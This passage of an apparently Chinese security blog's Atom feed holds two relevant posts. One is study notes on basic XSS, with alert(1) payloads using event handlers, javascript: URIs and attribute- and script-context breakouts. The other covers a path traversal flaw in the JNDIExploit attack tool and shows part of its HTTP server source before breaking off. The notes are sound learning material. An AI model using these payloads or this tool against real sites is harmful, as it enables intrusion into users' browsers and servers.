<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kaikaix</title>
  
  <subtitle>小白</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-09-23T10:48:58.144Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>kaikaix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>前端安全2-基础xss（笔记）</title>
    <link href="http://example.com/2023/09/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A82-%E5%9F%BA%E7%A1%80xss%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A82-%E5%9F%BA%E7%A1%80xss%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-20T09:18:25.000Z</published>
    <updated>2023-09-23T10:48:58.144Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊一下基础的xss，等着huli大佬写奇淫技巧<br><span id="more"></span></p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10314883">https://ithelp.ithome.com.tw/articles/10314883</a></li></ul><h2 id="触发js代码"><a href="#触发js代码" class="headerlink" title="触发js代码"></a>触发js代码</h2><p>一般来说是用script标签去触发的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>但是除了script标签，还可以用inline event handler来进行触发<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;not_exist&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml">&lt;svg/onload=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>常见的用来触发event handler的有</p><ul><li>onerror</li><li>onload</li><li>onfocus</li><li>onblur</li><li>onanimationend</li><li>onclick</li><li>onmouseenter</li></ul><p>等等</p><p>当然还可以用伪协议去触发js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure><br>这里有个值得注意的点，可以把href后面的伪协议当做字符串，这时候如果用了html编码也可以触发js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&amp;#x6a;<span class="attr">avascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>在这个网站有更多的payload<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p><h2 id="不同的xss"><a href="#不同的xss" class="headerlink" title="不同的xss"></a>不同的xss</h2><h3 id="注入html"><a href="#注入html" class="headerlink" title="注入html"></a>注入html</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Hello, &lt;h1&gt;&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种就直接htmlspecialchar就可以过滤了，比较常见不多赘述了</p><h3 id="注入属性"><a href="#注入属性" class="headerlink" title="注入属性"></a>注入属性</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;content&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> clazz = qs.<span class="title function_">get</span>(<span class="string">&#x27;clazz&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#content&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;div class=&quot;<span class="subst">$&#123;clazz&#125;</span>&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">      Demo</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">  `</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这段代码会获取get参数的clazz，并拼接到<code>&lt;div class=&quot;&quot;&gt;</code>中</p><p>那么注入xss的方式有几种</p><p>第一种闭合div，增加一个标签<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;img src=not_exist onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>那么代码就会变为<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">not_exist</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span></span><br><span class="line"><span class="language-xml">  Demo</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>第二种闭合”然后增加属性<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; tabindex=1 onfocus=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot; x=&quot;</span></span><br></pre></td></tr></table></figure><br>那么就会变成<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span> tabindex=<span class="number">1</span> onfocus=<span class="string">&quot;alert(1)&quot;</span> x=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">Demo</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><h3 id="注入到js中"><a href="#注入到js中" class="headerlink" title="注入到js中"></a>注入到js中</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = `<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspeicalchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="meta">?&gt;</span>`;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当代码是这样的时候<br><code>?name=$&#123;alert(1)&#125;</code>可以用这种语句去注入js</p><p>如果是用双引号的形式，如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = <span class="string">&quot;&lt;?php echo htmlspeicalchars(<span class="subst">$_GET</span>[&#x27;name&#x27;]) ?&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>这样可能就没法进行注入js了，但是如果没有htmlspeicalchars过滤的话，就可以用闭合<code>&quot;</code>或者闭合<code>&lt;script&gt;</code>标签进行注入,在注入其他标签<br>例如<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">&quot;;alert(1);&quot;</span></span><br><span class="line">name=&lt;/script&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;聊一下基础的xss，等着huli大佬写奇淫技巧&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>IELTS learning by chatgpt</title>
    <link href="http://example.com/2023/09/17/IELTS-learning-by-chatgpt/"/>
    <id>http://example.com/2023/09/17/IELTS-learning-by-chatgpt/</id>
    <published>2023-09-17T08:59:37.000Z</published>
    <updated>2023-09-17T08:59:37.285Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>JNDIExploit路径穿越漏洞</title>
    <link href="http://example.com/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-09-16T07:34:23.000Z</published>
    <updated>2023-09-16T08:10:39.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h2><span id="more"></span><p>该工具启动命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 0.0.0.0</span><br></pre></td></tr></table></figure><br>默认会启动http服务器<br>该工具http服务器相应的代码位于项目<br><code>src/main/java/com/feihong/ldap/HTTPServer.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.feihong.ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.io.file.FileReader;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.CommandTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.DnslogTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.ReverseShellTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Cache;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Config;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Util;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.reflect.FieldUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cwd</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(Config.httpPort), <span class="number">0</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HttpHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[+] New HTTP Request From &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot;  &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> httpExchange.getRequestURI().getPath();</span><br><span class="line">                    <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.class&quot;</span>))&#123;</span><br><span class="line">                        handleClassRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.wsdl&quot;</span>))&#123;</span><br><span class="line">                        handleWSDLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.jar&quot;</span>))&#123;</span><br><span class="line">                        handleJarRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;/xxelog&quot;</span>))&#123;</span><br><span class="line">                        handleXXELogRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.sql&quot;</span>))&#123;</span><br><span class="line">                        handleSQLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (path.endsWith(<span class="string">&quot;.groovy&quot;</span>))&#123;</span><br><span class="line">                        handlerGroovyRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">                        handleXMLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">                        handleTXTRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span 